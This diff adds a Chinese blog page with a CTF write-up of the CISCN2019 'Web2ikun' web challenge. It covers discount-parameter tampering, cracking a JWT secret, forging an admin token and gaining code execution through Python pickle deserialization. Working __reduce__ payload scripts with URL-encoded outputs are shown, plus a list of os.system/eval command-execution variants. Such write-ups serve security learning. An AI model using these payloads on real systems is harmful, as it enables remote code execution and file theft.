@@ -1,0 +1,214 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>CISCN2019 华北赛区 Day1 Web2ikun | First article</title><meta name="author" content="Van"><meta name="copyright" content="Van"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="打开发现是商场购物页面 提示要买lv6，点下一页看看，还是一堆商品，感觉是要写脚本找到lv6，调试一下找到lv相关信息，写脚本找到。在page181里面 点商品，注意有两个，一个是商品详情页，一个是直接点购买 抓包发现 有price还有折扣，发现改price怎么改都不行，那么就试试只改折扣。 暴露了后台地址，访问发现只能admin 又注意到抓包有jwt。 解密 https:&#x2F;&#x2F;jwt.io&#x2F; 要改">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2019 华北赛区 Day1 Web2ikun">
+<meta property="og:url" content="http://van0308.github.io.git/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/index.html">
+<meta property="og:site_name" content="First article">
+<meta property="og:description" content="打开发现是商场购物页面 提示要买lv6，点下一页看看，还是一堆商品，感觉是要写脚本找到lv6，调试一下找到lv相关信息，写脚本找到。在page181里面 点商品，注意有两个，一个是商品详情页，一个是直接点购买 抓包发现 有price还有折扣，发现改price怎么改都不行，那么就试试只改折扣。 暴露了后台地址，访问发现只能admin 又注意到抓包有jwt。 解密 https:&#x2F;&#x2F;jwt.io&#x2F; 要改">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://van0308.github.io.git/img/lufee.jpg">
+<meta property="article:published_time" content="2023-02-03T15:46:44.000Z">
+<meta property="article:modified_time" content="2023-02-04T13:15:57.090Z">
+<meta property="article:author" content="Van">
+<meta property="article:tag" content="pickle反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://van0308.github.io.git/img/lufee.jpg"><link rel="shortcut icon" href="/img/lufee.jpg"><link rel="canonical" href="http://van0308.github.io.git/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CISCN2019 华北赛区 Day1 Web2ikun',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-02-04 21:15:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="First article" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/lufee.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 博文</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.netbian.com/uploads/allimg/180402/093802-15226330828228.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="First article"><span class="site-name">First article</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 博文</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CISCN2019 华北赛区 Day1 Web2ikun</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-03T15:46:44.000Z" title="发表于 2023-02-03 23:46:44">2023-02-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-04T13:15:57.090Z" title="更新于 2023-02-04 21:15:57">2023-02-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CISCN2019 华北赛区 Day1 Web2ikun"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>打开发现是商场购物页面</p>
+<p>提示要买lv6，点下一页看看，还是一堆商品，感觉是要写脚本找到lv6，调试一下找到lv相关信息，写脚本找到。在page181里面</p>
+<p>点商品，注意有两个，一个是商品详情页，一个是直接点购买</p>
+<p>抓包发现</p>
+<p>有price还有折扣，发现改price怎么改都不行，那么就试试只改折扣。</p>
+<p>暴露了后台地址，访问发现只能admin</p>
+<p>又注意到抓包有jwt。</p>
+<p>解密 <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<p>要改则必须破解密码 利用 c-jwt-cracker</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack   加密后的结果</span><br></pre></td></tr></table></figure>
+
+<p>密钥1Kun</p>
+<p>改完重新发包，点击一键成为大会员没什么用</p>
+<p>看源代码，发现泄露，下载完审计</p>
+<p>发现有hint</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br><span class="line">Unicode解码得</span><br><span class="line">这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里</span><br></pre></td></tr></table></figure>
+
+<p>找后门</p>
+<p>在Admin.py找到</p>
+<p>pickle：Python对象的持久化存储</p>
+<p>功能：将任意Python对象存储及恢复</p>
+<p>关键函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump()   文件</span><br><span class="line">pickle.load()</span><br><span class="line">pickle.dumps()	字符串</span><br><span class="line">pickle.loads()</span><br><span class="line">dump()：将 Python 中的对象序列化成二进制对象，并写入文件；</span><br><span class="line">load()：读取指定的序列化数据文件，并返回对象。</span><br><span class="line">dumps()：将 Python 中的对象序列化成二进制对象，并返回；</span><br><span class="line">loads()：读取给定的二进制对象数据，并将其转换为 Python 对象；</span><br></pre></td></tr></table></figure>
+
+<p>具体用法</p>
+<p>​	<a target="_blank" rel="noopener" href="http://c.biancheng.net/view/5736.html">Python pickle模块：实现Python对象的持久化存储 (biancheng.net)</a></p>
+<p>反序列化详解</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p>
+<p>只要在序列化中的字符串中存在<code>R</code>指令，<code>__reduce__</code>方法就会被执行，无论正常程序中是否写明了<code>__reduce__</code>方法</p>
+<p>记得生成payload时使用的python版本尽量与目标上的版本一致</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = pickle.loads(urllib.unquote(become))</span><br><span class="line"></span><br><span class="line">urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式</span><br><span class="line">pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回</span><br><span class="line"></span><br><span class="line">在 Python2.x 中的用法是：</span><br><span class="line">urllib.quote(text)</span><br><span class="line">Python3.x 中是</span><br><span class="line">urllib.parse.quote(text)</span><br><span class="line">URL 中传参数的部分（query String），格式是：</span><br><span class="line">name1=value1&amp;name2=value2&amp;name3=value3</span><br><span class="line">假如你的 name 或者 value 值中有『&amp;』或者『=』等符号，就当然会有问题。所以URL中的参数字符串也需要把『&amp;=』等符号进行编码。</span><br><span class="line">URL编码的方式是把需要编码的字符转化为 %xx 的形式。</span><br></pre></td></tr></table></figure>
+
+<p>继续做题</p>
+<p>点击一键成为大会员，抓包发现become参数，利用reduce方法构造poc，修改become值，执行命令</p>
+<p>Python2和Python3的执行结果不同，下面Python2的成功了（不明原因）</p>
+<p>读取目录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.listdir, (<span class="string">&#x27;/&#x27;</span>,))<span class="comment"># reduce第二个参数得是元组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#print a</span></span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="comment"># cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.  </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.listdir, (<span class="string">&#x27;/&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># cnt%0Alistdir%0Ap0%0A%28V/%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure>
+
+<p>最后执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">&#x27;cat /flag.txt&#x27;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        s = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">        <span class="comment"># return (os.listdir, (&#x27;/&#x27;,))</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (s,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># c__builtin__%0Aeval%0Ap0%0A%28V__import__%28%27os%27%29.popen%28%27cat%20/flag.txt%27%29.read%28%29%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">一些可执行的</span><br><span class="line"><span class="comment"># 未导入os模块，通用</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;calc.exe&#x27;</span>,))</span><br><span class="line"><span class="comment"># return eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"><span class="comment"># return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 导入os模块</span></span><br><span class="line"> <span class="comment"># return (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"> <span class="comment"># return eval, (&quot;os.system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"> <span class="comment"># return map, (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"> <span class="comment"># return map, (os.system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> <span class="comment"># return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))</span></span><br></pre></td></tr></table></figure>
+
+<p>深入学习：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/361349643">pickle反序列化的利用技巧总结 - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/16305695.html">CTF-python pickle反序列化 - sijidou - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11807">最近碰到的 Python pickle 反序列化小总结 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/127664.html">python反序列化攻击 - SecPulse.COM | 安全脉搏</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://Van0308.github.io.git">Van</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://van0308.github.io.git/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/">http://van0308.github.io.git/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://Van0308.github.io.git" target="_blank">First article</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化</a></div><div class="post_share"><div class="social-share" data-image="/img/lufee.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/02/03/%E5%BE%85%E5%AD%A6/" title="待学"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">待学</div></div></a></div><div class="next-post pull-right"><a href="/2023/02/03/hexo-GitHub-butterfly/" title="hexo+GitHub+butterfly"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">hexo+GitHub+butterfly</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/lufee.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Van</div><div class="author-info__description">铁马冰河入梦来</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Van0308"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/02/03/%E5%BE%85%E5%AD%A6/" title="待学">待学</a><time datetime="2023-02-03T15:47:07.000Z" title="发表于 2023-02-03 23:47:07">2023-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/" title="CISCN2019 华北赛区 Day1 Web2ikun">CISCN2019 华北赛区 Day1 Web2ikun</a><time datetime="2023-02-03T15:46:44.000Z" title="发表于 2023-02-03 23:46:44">2023-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/02/03/hexo-GitHub-butterfly/" title="hexo+GitHub+butterfly">hexo+GitHub+butterfly</a><time datetime="2023-02-03T14:16:02.000Z" title="发表于 2023-02-03 22:16:02">2023-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/02/02/hello-world/" title="Hello World">Hello World</a><time datetime="2023-02-02T09:13:27.137Z" title="发表于 2023-02-02 17:13:27">2023-02-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Van</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
